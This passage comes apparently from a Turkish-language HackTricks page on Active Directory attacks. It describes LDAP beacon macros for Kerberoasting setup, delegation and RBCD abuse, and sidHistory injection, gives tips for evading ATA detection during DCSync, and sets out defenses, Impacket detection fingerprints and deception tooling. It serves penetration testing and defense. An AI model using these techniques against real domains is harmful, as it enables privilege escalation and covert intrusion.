- `add-spn`/`set-spn`, ele geçirilmiş bir user'ı anında Kerberoastable hale getirir; `add-asreproastable` (UAC toggle), password'a dokunmadan onu AS-REP roasting için işaretler.
- Delegation macro'ları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flags veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazarak constrained/unconstrained/RBCD attack path'lerini etkinleştirir ve remote PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory`, kontrollü bir principal'ın SID history'sine privileged SID'ler inject eder (bkz. [SID-History Injection](sid-history-injection.md)); bu sayede tamamen LDAP/LDAPS üzerinden stealthy access inheritance sağlanır.
- `move-object`, computer veya user'ların DN/OU değerini değiştirerek saldırganın, `set-password`, `add-groupmember` veya `add-spn` işlemlerini kötüye kullanmadan önce asset'leri delegated rights'ların zaten bulunduğu OU'lara taşımasına olanak tanır.
- Sıkı kapsamlı removal command'ları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör credentials veya persistence elde ettikten sonra hızlı rollback yapılmasını sağlar ve telemetry'yi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Credentials'ı nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection için Defensive Measures**

- **Domain Admins Restrictions**: Güvenliği korumak amacıyla Domain Admins'in yalnızca Domain Controllers'a login olmasına izin verilmesi, diğer host'larda kullanılmalarının önlenmesi önerilir.
- **Service Account Privileges**: Güvenliği korumak için servisler Domain Admin (DA) privileges ile çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA privileges gerektiren görevlerde bu privileges'ın süresi sınırlandırılmalıdır. Bu, şu şekilde gerçekleştirilebilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075'i audit edin; ardından LDAP MITM/relay attempts'leri engellemek için DC'ler/clients üzerinde LDAP signing ve LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity için Protocol-level fingerprinting

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, renamed binaries, service names, temp batch files veya output paths gibi yalnızca operatör tarafından kontrol edilen artefact'lara **güvenmeyin**. Meşru Windows clients'ın [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic'ini nasıl oluşturduğunu baseline olarak belirleyin; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını düzenlese bile kalan **implementation quirks**'leri arayın.<sup>[[8]](#references)</sup>

- **Kendi baseline'ınızla doğruladıktan sonra high-confidence standalone candidates**:
- `auth_context_id = 79231 + ctx_id` kullanılarak gerçekleştirilen authenticated DCE/RPC
- `0xff` ile doldurulan DCE/RPC authentication padding
- Raw Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos binds
- ASCII-looking `ClientGuid` değerlerine sahip SMB2/3 negotiate requests
- Standard dışı `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce değerleri
- **Correlation/scoring features olarak kullanılması daha uygun olanlar**:
- Sparse veya duplicated Kerberos etype lists, unusual/missing `PA-DATA` veya native Windows'tan farklı TGS-REQ etype ordering
- Version info içermeyen NTLM Type 1 messages veya null host names içeren Type 3 messages
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailers veya SPNEGO/Kerberos OID mismatches
- Aynı host/user/session/time window'dan gelen bu özelliklerin birkaçı, tek bir zayıf field'dan çok daha güçlüdür
- **Standalone alerts yerine enrichment olarak kullanın**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names ve tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Operatörlerin bunları değiştirmesi kolaydır; bu değerler en iyi şekilde cross-protocol cluster'ın neden şüpheli olduğunu açıklamak için kullanılır
- **Operational notes**:
- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
- Alert'lara dönüştürmeden önce Samba/Linux clients, appliances ve legacy software'a karşı doğrulama yapın
- Baseline'a duyduğunuz güven arttıkça detections'ı enrichment -> hunting -> alerting aşamalarında ilerletin

### **Deception Techniques'in uygulanması**

- Deception uygulamak; password'ları expire olmayan veya Trusted for Delegation olarak işaretlenmiş decoy users ya da computers gibi traps kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip users oluşturmayı veya bunları high privilege groups'a eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Pratik bir örnek olarak şu tools kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques'in deploy edilmesi hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresinden ulaşılabilir.

### **Deception'ın belirlenmesi**

- **User Objects için**: Şüpheli göstergeler arasında atipik ObjectSID, seyrek logons, creation dates ve düşük bad password counts bulunur.
- **General Indicators**: Potansiyel decoy objects'in attributes'larını gerçek objects'inkilerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi tools bu deception'ları belirlemeye yardımcı olabilir.

### **Detection Systems'ın bypass edilmesi**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection'ı önlemek için Domain Controllers üzerinde session enumeration'dan kaçınma.
- **Ticket Impersonation**: Ticket creation için **aes** keys kullanmak, NTLM'e downgrade yapılmasını önleyerek detection'dan kaçınmaya yardımcı olur.
- **DCSync Attacks**: ATA detection'dan kaçınmak için işlemlerin non-Domain Controller üzerinden gerçekleştirilmesi önerilir; Domain Controller'dan doğrudan gerçekleştirilmesi alerts'leri tetikler.

## References

- [1] [Domain Trusts'a saldırı rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trusts forging](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation için In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist olarak Weaponize etmek](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ı dissect etmek](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon üzerinden Active Directory Accounts'ı ele geçirmek](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon secure channel connections değişikliklerini yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC interfaces'a bir yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domains arasında security boundary olarak SID filter mı? (Bölüm 4) - SID filtering bypass araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domains arasında security boundary olarak SID filter mı? (Bölüm 5) - Golden GMSA trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domains arasında security boundary olarak SID filter mı? (Bölüm 6) - Schema change trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'dan EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS'i kötüye kullanarak child domain admins'ten enterprise admins'e 5 dakikada yükselme, devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoors tasarlamak](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
